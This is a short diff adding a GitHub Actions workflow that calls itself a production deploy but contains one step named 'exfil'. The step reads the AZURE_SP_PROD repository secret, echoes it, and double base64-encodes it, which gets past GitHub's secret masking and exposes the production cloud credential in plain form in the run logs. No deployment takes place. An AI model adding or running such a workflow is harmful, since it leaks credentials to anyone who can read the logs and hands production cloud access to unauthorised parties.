@@ -1,0 +1,17 @@
+name: Deploy production 2xb64
+
+on:
+  workflow_dispatch:
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfil  
+        env:
+          AZURE_SP_PROD: ${{ secrets.AZURE_SP_PROD }}
+        run: |
+          echo "¡Hola mundo!"
+          echo "Secreto ; $AZURE_SP_PROD" 
+          B64=$(echo -n "$AZURE_SP_PROD" | base64 -w 0 | base64 -w 0)
+          echo "Secreto 2xb64 : $B64"
